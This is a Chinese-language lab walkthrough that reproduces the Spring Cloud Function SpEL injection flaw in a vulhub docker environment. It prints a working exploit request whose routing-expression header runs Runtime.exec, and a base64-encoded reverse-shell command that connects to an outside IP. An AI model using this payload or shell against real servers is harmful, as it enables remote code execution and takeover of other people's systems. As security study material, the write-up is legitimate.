## 漏洞简介：

由于Spring
CloudFunction中RoutingFunction类的apply方法将请求头中的"spring.cloud.function.routing-expression"参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，当使用路由功能时，攻击者可利用该漏洞远程执行任意代码。

## 影响版本：

3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

### 一、复现工具：

> 1.docker+vulhub
>
> 2.burpsuite
>
> 3.一台vps（虚拟机也可以）

docker跟vulhub安装下载就不说了，网上多的是，下面启动漏洞环境的命令

> systemctl start docker 启动docker
>
> docker-compose up -d启动漏洞环境
>
> docker-compose down 删除漏洞环境

### 二、漏洞验证

1.访问8080端口

![](https://image.3001.net/images/20220920/1663660406_6329717640ead8277b31d.png!small)

2.访问/uppercase抓包

![](https://image.3001.net/images/20220920/1663660418_632971825ff27a8f69f54.png!small)

3.更改为post包，添加post包信息

![](https://image.3001.net/images/20220920/1663660433_63297191a9ba2ccc60aa4.png!small)

    
    
    POST /functionRouter HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Upgrade-Insecure-Requests: 1
    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/webroot")
    Content-Type: text/plain
    Content-Length: 25
    
    Content-Length: 7
    
    test

4.创建成功

![](https://image.3001.net/images/20220920/1663660454_632971a69d863abb26271.png!small)

### 三、反弹 shell

1.把touch /tmp/webroot修改为反弹shell的命令

    
    
    "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIuMjI0LjIxLjE1OC8yNjI2IDA+JjE=}|{base64,-d}|{bash,-i}

![](https://image.3001.net/images/20220920/1663660645_63297265ea54581c4e68a.png!small)

2.反弹成功

![](https://image.3001.net/images/20220920/1663660687_6329728f70378851d346f.png!small)

